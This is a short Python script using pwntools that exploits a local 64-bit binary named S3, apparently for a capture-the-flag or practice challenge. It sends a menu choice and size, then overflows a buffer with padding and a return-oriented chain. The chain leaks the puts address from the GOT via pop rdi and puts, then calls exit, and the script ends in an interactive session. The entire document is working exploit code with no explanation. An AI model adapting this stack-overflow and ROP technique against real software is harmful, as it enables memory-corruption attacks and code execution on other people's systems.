from pwn import * #64bit

e = ELF("./S3")
libc = e.libc

p = process("./S3")
write = 0x4010f0
puts_plt = 0x4010e0
puts_got = 0x403f98
exit_plt = 0x401180
poprdi = 0x401de3

p.recvuntil(b"> ")
p.sendline(b'1')
p.recvuntil("size : ")
p.sendline(p64(10))
payload = b"A"*0x28
payload += b"A"*8
payload += p64(poprdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(poprdi)
payload += p64(1)
payload += p64(exit_plt)

p.sendlineafter("data : ",payload)

p.interactive()
